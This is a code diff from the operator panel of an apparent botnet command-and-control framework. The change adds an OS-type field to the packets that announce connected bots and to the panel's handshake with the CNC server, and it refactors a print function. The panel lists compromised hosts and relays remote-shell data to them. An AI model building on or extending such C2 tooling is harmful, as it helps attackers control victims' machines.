@@ -38,7 +38,7 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
     tShell_client *client = (tShell_client*)uData;
     tShell_peer *bot;
-    uint8_t type;
+    uint8_t type, osType;
 
     /* read newly connected peer's pubKey */
     laikaS_read(&peer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
@@ -48,15 +48,16 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     laikaS_read(&peer->sock, inet, LAIKA_INET_LEN);
     laikaS_read(&peer->sock, ipv4, LAIKA_IPV4_LEN);
 
-    /* read peer's peerType */
+    /* read peer's peerType & osType */
     type = laikaS_readByte(&peer->sock);
+    osType = laikaS_readByte(&peer->sock);
 
     /* ignore panel clients */
     if (type == PEER_AUTH)
         return;
 
     /* create peer */
-    bot = shellP_newPeer(type, pubKey, hostname, inet, ipv4);
+    bot = shellP_newPeer(type, osType, pubKey, hostname, inet, ipv4);
 
     /* add peer to client */
     shellC_addPeer(client, bot);
@@ -116,7 +117,7 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
         shellC_handleAddPeer,
-        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t),
+        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t) + sizeof(uint8_t),
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
         shellC_handleRmvPeer,
@@ -205,6 +206,7 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
     laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
+    laikaS_writeByte(sock, LAIKA_OSTYPE);
     laikaS_write(sock, client->pub, sizeof(client->pub)); /* write public key */
 
     /* write stub hostname & ipv4 (since we're a panel/dummy client, cnc doesn't need this information really) */
@@ -297,7 +299,7 @@ int shellC_addPeer(tShell_client *client, tShell_peer *newPeer) {
     /* let user know */
     if (!shellC_isShellOpen(client)) {
         shellT_printf("\nNew peer connected to CNC:\n");
-        shellC_printInfo(newPeer);
+        shellP_printInfo(newPeer);
     }
     return id;
 }
@@ -311,7 +313,7 @@ void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
 
     if (!shellC_isShellOpen(client)) {
         shellT_printf("\nPeer disconnected from CNC:\n");
-        shellC_printInfo(oldPeer);
+        shellP_printInfo(oldPeer);
     }
 
     /* finally, free peer */
@@ -350,11 +352,4 @@ void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
     laikaS_startVarPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
     laikaS_write(&client->peer->sock, data, sz);
     laikaS_endVarPacket(client->peer);
-}
-
-void shellC_printInfo(tShell_peer *peer) {
-    char buf[128];
-
-    sodium_bin2hex(buf, sizeof(buf), peer->pub, crypto_kx_PUBLICKEYBYTES);
-    shellT_printf("\t%s@%s\n\tTYPE: %s\n\tPUBKEY: %s\n\tINET: %s\n", peer->hostname, peer->ipv4, shellP_typeStr(peer), buf, peer->inet);
 }
